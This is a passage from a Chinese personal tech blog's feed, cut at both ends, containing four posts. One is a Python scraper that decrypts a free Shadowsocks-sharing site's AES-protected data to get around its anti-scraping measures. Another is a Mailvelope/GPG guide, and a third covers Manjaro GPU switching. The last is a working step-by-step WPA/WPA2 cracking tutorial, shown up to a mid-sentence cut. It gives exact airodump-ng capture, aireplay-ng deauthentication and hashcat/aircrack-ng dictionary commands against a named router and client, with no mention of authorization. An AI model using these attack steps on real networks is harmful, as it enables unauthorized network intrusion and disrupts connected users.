class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'</span>&#125;</span><br><span class="line">url= <span class="string">"https://free-ss.site/"</span></span><br><span class="line">url2=<span class="string">"https://free-ss.site/data.php"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取正确的a,b,c参数</span></span><br><span class="line">s = requests.session()</span><br><span class="line">html = s.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">a,b,c = re.findall(<span class="string">r"\'(.*?)\'"</span>,html.text)[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#post提交a,b,c,得到密文</span></span><br><span class="line">p_data = &#123;<span class="string">'a'</span>:a,<span class="string">'b'</span>:b,<span class="string">'c'</span>:c&#125;</span><br><span class="line">msg = s.post(url2,headers=headers,data=p_data,timeout=<span class="number">3</span>)</span><br><span class="line">endata = base64.b64decode(msg.text) <span class="comment">#返回的是base64编码数据，先解码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#用正确的参数初始化AES，ECB模式不需要iv向量</span></span><br><span class="line">key = bytes(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="comment">#iv = bytes(b,encoding="utf-8")</span></span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"><span class="comment">#解密得到数据</span></span><br><span class="line">data ＝ aes.decrypt(endata).decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>我们可以看到数据末尾多了一些无用字符，因为AES加密需要原始数据块是16位的倍数，不足则用按照某些标准(诸如源码中的Pkcs7)进行填充补位。<br><img src="/img/free-ss_3.png" alt="ss_data"><br>我们继续处理解密后的数据，生成ss链接以方便直接导入<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">ss_data = re.findall(<span class="string">r'&#123;.*&#125;'</span>,data)[<span class="number">0</span>] <span class="comment">#去掉多余的填充字符</span></span><br><span class="line">ss_json = json.loads(ss_data)[<span class="string">'data'</span>] <span class="comment">#json化数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss_json:</span><br><span class="line">    <span class="comment">#ss://method:password@server:port</span></span><br><span class="line">    ss = <span class="string">"&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;"</span>.format(i[<span class="number">3</span>],i[<span class="number">4</span>],i[<span class="number">1</span>],i[<span class="number">2</span>])</span><br><span class="line">    ss_url = <span class="string">"ss://"</span>+ bytes.decode( base64.b64encode(bytes(ss,encoding=<span class="string">"utf8"</span>)) )</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    print(ss_url)</span><br></pre></td></tr></table></figure></p><p>后来发现网站每次使用的加密方法都是随机的，Crypto-js一共实现了AES的5种加密模式:CBC、CFB、CTR、ECB、OFB,每种都用Python实现太麻烦了，这里我们取个巧：判断加密模式，如果是ECB，则进行解密，否则重新请求网页信息。整个Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'</span>&#125;</span><br><span class="line">    url= <span class="string">"https://free-ss.site/"</span></span><br><span class="line">    url2=<span class="string">"https://free-ss.site/data.php"</span> </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        s = requests.session()</span><br><span class="line">        html = s.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        mode  = re.findall(<span class="string">r"CryptoJS.mode.(\w&#123;3&#125;)"</span>,html.text)</span><br><span class="line">        print(mode)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ECB'</span> <span class="keyword">in</span> mode:</span><br><span class="line">            a,b,c = re.findall(<span class="string">r"\'(.*?)\'"</span>,html.text)[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">            p_data = &#123;<span class="string">'a'</span>:a,<span class="string">'b'</span>:b,<span class="string">'c'</span>:c&#125;</span><br><span class="line">            msg = s.post(url2,headers=headers,data=p_data,timeout=<span class="number">3</span>)</span><br><span class="line">            endata = base64.b64decode(msg.text)</span><br><span class="line">            key = bytes(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">            aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">            data = aes.decrypt(endata).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            ss_data = re.findall(<span class="string">r'&#123;.*&#125;'</span>,data)[<span class="number">0</span>]</span><br><span class="line">            ss_json = json.loads(ss_data)[<span class="string">'data'</span>] </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> ss_json:</span><br><span class="line">                <span class="comment">#ss://method:password@server:port</span></span><br><span class="line">                ss = <span class="string">"&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;"</span>.format(i[<span class="number">3</span>],i[<span class="number">4</span>],i[<span class="number">1</span>],i[<span class="number">2</span>])</span><br><span class="line">                ss_url = <span class="string">"ss://"</span>+ bytes.decode( base64.b64encode(bytes(ss,encoding=<span class="string">"utf8"</span>)) )</span><br><span class="line">                <span class="comment">#print(ss)</span></span><br><span class="line">                print(ss_url)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>完整脚本已经放在<a href="https://github.com/xiaoTaoist/Auto-Shadowsocks" target="_blank" rel="noopener">Github</a>上,<a href="https://github.com/xiaoTaoist/Auto-Shadowsocks/releases/download/v1.0/freess.zip" target="_blank" rel="noopener">一键版下载地址</a></p><p><strong>本文仅供学习交流，如有冒犯之处，联系可删。</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.zhengxianjun.com/2015/05/javascript-crypto-js" target="_blank" rel="noopener">https://blog.zhengxianjun.com/2015/05/javascript-crypto-js</a></li><li><a href="https://gist.github.com/marcoslin/8026990" target="_blank" rel="noopener">https://gist.github.com/marcoslin/8026990</a></li><li><a href="https://bbs.pediy.com/thread-224363.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224363.htm</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;无意间发现了一个&lt;a href=&quot;https://free-ss.site/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SS帐号分享站&lt;/a&gt;，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>保护你的邮件通信——Mailvelope（GPG）</title>
    <link href="https://xiaotaoist.github.io/2018/03/29/gpg/"/>
    <id>https://xiaotaoist.github.io/2018/03/29/gpg/</id>
    <published>2018-03-29T00:41:41.000Z</published>
    <updated>2018-04-06T14:21:06.559Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” </p><blockquote><p>爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1]</p></blockquote><p>虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。</p><a id="more"></a><blockquote><p>加密可以保护我们的数据。无论数据是正存放在我们自己的计算机上，还是位于数据中心，或者正在通过互联网传送的途中，加密都可以提供防护。加密可以保护我们的聊天，不管是视频、语音还是文字。加密可以保护我们的隐私，可以隐藏我们的踪迹，甚至有时候，它会保护我们的性命。</p><p>这种保护是攸关我们每个人的。不需要太多解释就可以明白，加密对于活动于威权国家中的记者与人权或政治活动家的重要性。但加密同样也会保护不属于这些群体的其他人。加密抵御犯罪分子的入侵，抵御竞争对手的窃密，防止家庭成员或者邻居偷窥。加密防御的不只是有意的攻击者，还包括没有预料到的意外情况。[2]</p></blockquote><p>下面介绍用Mailvelope在网页端上加密自己的电子邮件。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Mailvelope是一种浏览器扩展，遵守OpenPGP标准[3]可以对电子邮件和文件进行加密，解密，签名和认证。它不需要您下载或安装其他邮件客户端，就可以为WebMail用户提供端到端加密的最简单方法。<br>下载地址：<br><a href="https://chrome.google.com/webstore/detail/mailvelope/kajibbejlbohfaggdiogboambcijhkke?hl=zh-CN" target="_blank" rel="noopener">Chrome版</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/mailvelope/" target="_blank" rel="noopener">Firefox版</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>安装完成后，点击Mailvelope的插件图标，点设置图标进入设置页面。<br><img src="/img/mailvelope.png" alt="Mailvelope"></li><li>这里我们生成一个新的密钥,如果你已经有GPG密钥,可以直接导入。<br><img src="/img/maillvelope_genkey.png" alt="genkey"></li><li>导出你的公钥，文本框中的内容即为你的公钥，任何可以获得你公钥的人都可以给你发加密邮件<br><img src="/img/mailvelope_pub.png" alt="pub"></li><li>导入别人的公钥，有对方的公钥才能给它发送加密邮件。<br><img src="/img/mailvelope_import.png" alt="import"></li><li>进入你的网页邮箱，如果你的邮件服务商在mailvelope默认支持列表中，在写信框中会出现一个小图标。<br><img src="/img/mailvelope_send.png" alt="send"><br>如果没有发现，请添加网站支持后，刷新页面生效。<br><img src="/img/mailvelope_add.png" alt="add"></li><li>点击小图标，会弹出对话框（这里貌似有一个bug，在弹出窗口<strong>右键单击</strong>才会<strong>显示内容</strong>）开始写内容。<br><img src="/img/mailvelope_write.png" alt="write"></li><li>撰写完成后点加密。发现已经变成了密文，即可发送给对方。(如果开启了签名，还需要输入你创建密钥时设置的密码才可以加密内容)<br><img src="/img/mailvelope_gpg.png" alt="gpg"></li><li>收到加密邮件，点一下，在弹出窗口输入你的私钥密码即可成功解密。<br><img src="/img/mailvelope_rev.png" alt="inbox"></li></ul><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>Mailvelope 不会加密你的邮箱地址和对方的邮箱地址以及主题名，请不要使用真实姓名注册邮箱，如果可以尽量单独申请一个隐私性较好的邮箱服务商（比如<a href="https://mail.protonmail.com" target="_blank" rel="noopener">ProtonMail</a>）。</li><li>请妥善保存你的私钥，做好备份，以防丢失后无法解密数据</li><li>第一次给对方发送加密电子邮件时，可以放心的将你的公钥一并附上，以方便对方给你回复加密邮件。[4]</li></ul><h3 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h3><ul><li>GPG原理：<a href="https://xeodou.me/2015/09/13/how-pgp-works/" target="_blank" rel="noopener">https://xeodou.me/2015/09/13/how-pgp-works/</a></li><li>隐私工具介绍：<a href="https://cybermagicsec.github.io/privacytools-zh/" target="_blank" rel="noopener">https://cybermagicsec.github.io/privacytools-zh/</a></li><li>安全工具箱指南：<a href="https://securityinabox.org/zh/" target="_blank" rel="noopener">https://securityinabox.org/zh/</a></li><li>编程随想的隐私保护技巧：<a href="https://program-think.blogspot.com/2013/06/privacy-protection-0.html" target="_blank" rel="noopener">https://program-think.blogspot.com/2013/06/privacy-protection-0.html</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 维基百科：无所隐瞒论 <a href="https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA</a><br>[2] 为什么要加密：<a href="https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html" target="_blank" rel="noopener">https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html</a><br>[3] OpenPGP标准：<a href="https://tools.ietf.org/html/rfc4880" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4880</a><br>[4] Mailvelope指南：<a href="https://securityinabox.org/en/guide/mailvelope/web/" target="_blank" rel="noopener">https://securityinabox.org/en/guide/mailvelope/web/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Privacy" scheme="https://xiaotaoist.github.io/tags/Privacy/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro Linux 配置Intel与Nvidia双显卡切换</title>
    <link href="https://xiaotaoist.github.io/2018/03/19/Bumblebee/"/>
    <id>https://xiaotaoist.github.io/2018/03/19/Bumblebee/</id>
    <published>2018-03-19T10:09:03.000Z</published>
    <updated>2018-03-31T02:32:57.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bumblebee"><a href="#Bumblebee" class="headerlink" title="Bumblebee"></a>Bumblebee</h2><p><a href="https://github.com/Bumblebee-Project/Bumblebee" target="_blank" rel="noopener">Bumblebee</a>是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Manjaro 提供了强大的硬件检测模块<code>mhwd</code>,可以很方便的安装各种驱动。</p><ul><li>安装依赖<blockquote><p>sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</p></blockquote></li><li>安装nvidia闭源驱动与intel驱动混合版bumblebee<blockquote><p>sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</p></blockquote></li></ul><a id="more"></a><ul><li>开启自动启动bumblebeed服务<blockquote><p>sudo systemctl enable bumblebeed</p></blockquote></li><li>将用户添加到bumblee组<blockquote><p>sudo gpasswd -a $USER bumblebee</p></blockquote></li></ul><p>如果一切顺利的话，重启后就可以在你想运行的程序名前面加<code>optirun</code>,好使用独立显卡驱动你的应用程序。</p><ul><li>但很大可能是重启后发现无法进入图形化界面,你可以尝试在Grub菜单启动界面按[E]编辑，找到<code>quite</code>并在后面加入(注意空格):<blockquote><p>acpi_osi=! acpi_osi=’Windows 2009’<br>或者<br>acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off<br><strong>(很多硬件厂商的BIOS驱动都对Linux不友好，无法顺利加载ACPI模块，而导致无法驱动独立显卡,acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，别闹情绪了，赶紧工作吧。)</strong><br>接着按[Ctrl]+[x]或[F10]保存更改并启动系统。</p></blockquote></li><li>顺利进入系统后打开终端更改配置文件<blockquote><p>sudo vim /etc/default/grub</p></blockquote></li><li>给 “GRUB_CMLINE_LINUX_DEFAULT”添加你可以正常启动Linux的‘acpi_osi’参数，如图我用的是’Windows 2009’。<br><img src="/img/manjaro_grub.png" alt="Grub"></li><li>更新Grub文件,即可永久解决不能启动图形界面的问题<blockquote><p>sudo update-grub</p></blockquote></li></ul><h2 id="测试性能"><a href="#测试性能" class="headerlink" title="测试性能"></a>测试性能</h2><ul><li>安装测试软件<blockquote><p>sudo pacman -S mesa-demos</p></blockquote></li><li>集显性能<blockquote><p>glxgears -info</p></blockquote></li><li>独显性能<blockquote><p>optirun glxgears -info</p></blockquote></li></ul><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li><p>NVIDIA面板无信息</p><blockquote><p>optirun -b none nvidia-settings -c :8</p></blockquote></li><li><p>不依赖Bumblebee来使用CUDA</p><blockquote><p>sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ‘ON’</p></blockquote></li><li>使用完CUDA 停止NVIDIA显卡<blockquote><p>sudo rmmod nvidia_uvm nvidia &amp;&amp; sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28" target="_blank" rel="noopener">https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28</a></li><li><a href="https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup" target="_blank" rel="noopener">https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup</a></li><li><a href="https://wiki.archlinux.org/index.php/Bumblebee#Primusrun" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Bumblebee#Primusrun</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bumblebee&quot;&gt;&lt;a href=&quot;#Bumblebee&quot; class=&quot;headerlink&quot; title=&quot;Bumblebee&quot;&gt;&lt;/a&gt;Bumblebee&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Bumblebee-Project/Bumblebee&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Bumblebee&lt;/a&gt;是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;Manjaro 提供了强大的硬件检测模块&lt;code&gt;mhwd&lt;/code&gt;,可以很方便的安装各种驱动。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装依赖&lt;blockquote&gt;
&lt;p&gt;sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;安装nvidia闭源驱动与intel驱动混合版bumblebee&lt;blockquote&gt;
&lt;p&gt;sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xiaotaoist.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>使用Aircrack&amp;hashcat破解WPA/WPA2</title>
    <link href="https://xiaotaoist.github.io/2018/03/15/aircrack-hashcat/"/>
    <id>https://xiaotaoist.github.io/2018/03/15/aircrack-hashcat/</id>
    <published>2018-03-15T11:45:11.000Z</published>
    <updated>2018-03-20T08:00:21.317Z</updated>
    
    <content type="html"><![CDATA[<p>====================</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这里假定你用的是Manjaro Linux 系统，<a href="/2018/03/19/Bumblebee/">配置好独立显卡</a>，本文提到的软件可以直接用<code>sudo pacman -S aircrack-ng hashcat hashcat-utils</code>安装,Kali Linux默认集成，其他环境请自行安装。</p><ul><li>aircrack-ng:<br><a href="https://www.aircrack-ng.org/doku.php" target="_blank" rel="noopener">aircrack-ng</a>是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。</li><li>hashcat:<br><a href="https://hashcat.net/wiki/" target="_blank" rel="noopener">hashcat</a>支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。</li><li>USB无线网卡:<br>推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。</li></ul><p>由于hashcat使用GPU破解，因此需要安装依赖，<code>sudo pacman -S ocl-icd opencl-nvidia</code>,执行<br><code>sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON</code>以让CUDA程序使用英伟达独立显卡。</p><a id="more"></a><blockquote><p>hashcat -I<br><img src="/img/hashcat.png" alt="hashcat"><br>看到你的独显信息就可以愉快的使用hashcat了。</p></blockquote><h2 id="Aircrack"><a href="#Aircrack" class="headerlink" title="Aircrack"></a>Aircrack</h2><ul><li><p>查看无线网卡，我的网卡为wlan0</p><blockquote><p>airmon-ng<br><img src="/img/aircrack_mon.png" alt="airmon"></p></blockquote></li><li><p>将网卡设为监听模式</p><blockquote><p>airmon-ng start wlan0<br>执行<code>iwconfig</code>出现<code>Mode:Monitor</code>即执行成功，并可以看到网卡被重命名为<code>wlan0mon</code>。<br>若执行失败，请先尝试<code>airmon-ng check kill</code>，依旧不行，请检查你的网卡驱动是否被<a href="https://wireless.wiki.kernel.org/en/users/drivers" target="_blank" rel="noopener">支持</a><br><img src="/img/aircrack_iw.png" alt="iwconfig"></p></blockquote></li><li><p>搜索目标</p><blockquote><p>airodump-ng wlan0mon<br><img src="/img/aircrack_dump.png" alt="airdump"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BSSID:无线路由的MAC地址</span><br><span class="line">PWR：无线信号强度（绝对值越小表示信号越强）</span><br><span class="line">CH:信道号</span><br><span class="line">ENC:加密体系，常见WPA，WPA2，WEP</span><br><span class="line">ESSID:扩展路由名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>这里以ELJNB为例，进行抓包：</p><blockquote><p>airodump-ng –bssid DC:FE:18:C4:20:E3 -o pcap -w my -c 1 wlan0mon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--bssid: 指定无线路由的MAC地址,这里是ELJNB的MAC地址</span><br><span class="line">-o:指定输出文件格式， 支持pcap, ivs, csv, gps, kismet, netxml</span><br><span class="line">-w:保存文件名称，会自动加01，02，03作为序号。</span><br><span class="line">-c:指定工作频道，ELJNB工作在频道1</span><br><span class="line">最后是你的网卡接口名称</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/img/aircrack_replay.png" alt="replay"><br>注意<code>STATION</code>那列里的MAC地址，稍后会用到，并保持airodump-ng一直处于运行状态。</p><ul><li>加速获取握手包<br>我们可以使用泛洪攻击断开某设备的连接，迫使其重连,以顺利捕获我们需要的数据（含有WiFi的密码数据包）。新开一个终端，输入<blockquote><p>aireplay-ng –deauth 1 –a DC:FE:18:C4:20:E3 -c E6:20:3A:A4:82:10 wlan0mon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--deauth:取消验证洪水攻击，后面是攻击次数，0代表无限次数。</span><br><span class="line">-a:目标路由MAC地址</span><br><span class="line">-c:连到这个路由某的设备MAC地址，可以在STATION那列中随便选一个。</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>回到airodump-ng窗口,若在右上角发现<code>WPA handshake</code> ，即成功捕获数据。若不成功请多试几次。<br><img src="/img/aircrack_wpa.png" alt="handskake"><br>顺利捕获数据后就可以用<code>Ctrl+C</code>终止airodump-ng了。会发现它在当前路径生成了一个my-01.cap文件，现在可以进行最后一步,破解数据了。</p><ul><li>暴力破解<ul><li>在线破解：<a href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php" target="_blank" rel="noopener">Online Hash Crack</a>  <a href="https://gpuhash.me/" target="_blank" rel="noopener">GPUHASH.me</a>  <a href="http://www.md5this.com/tools/wpa-wpa2-password-crack.html" target="_blank" rel="noopener">md5this</a></li><li>本地破解:<br><code>aircrack-ng -w dict.txt my-01.cap</code><br>这里破解速度就取决与你CPU性能和字典文件(dict.txt)够不够强大了。<br>如果需要，可以从网上找一些<a href="https://github.com/conwnet/wpa-dictionary" target="_blank" rel="noopener">字典文件</a><br>aircrack-ng使用CPU破解，效率比较低，这里推荐hashcat，它可以使用GPU加速你的破解过程。</li></ul></li></ul><h2 id="haschcat"><a href="#haschcat" class="headerlink" title="haschcat"></a>haschcat</h2><p>hashcat需要特殊的hash数据包格式，因此需要先将airodump-ng抓取的数据包转换一下，<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">在线转换</a>或本地使hashcat-utils所提供的工具包</p><ul><li><p>用cap2hccapx将cap转化为hccapx<br><img src="/img/cap2hccapx.png" alt="cap2hcc"></p></li><li><p>开始暴力破解</p><blockquote><p>hashcat -m 2500  test.hccapx dict.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-m:hash类型 2500 为wpa/wpa2</span><br><span class="line">test.hccapx:数据包文件</span><br><span class="line">dict.txt:为字典文件</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/img/hashcat_gpu.png" alt="hashcat"><br>破解结束后，查看结果</p><blockquote><p>cat ～/.hashcat/hashcat.porifle<br><img src="/img/hashcat_pro.png" alt="result"><br>最后即为WiFi密码，关于hashcat高级使用方式，见<a href="http://wps2015.org/drops/drops/GPU%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8Hashcat%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html" target="_blank" rel="noopener">wooyun</a></p></blockquote><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>可以看到，整个过程无非两步，第一步抓取<code>WPA 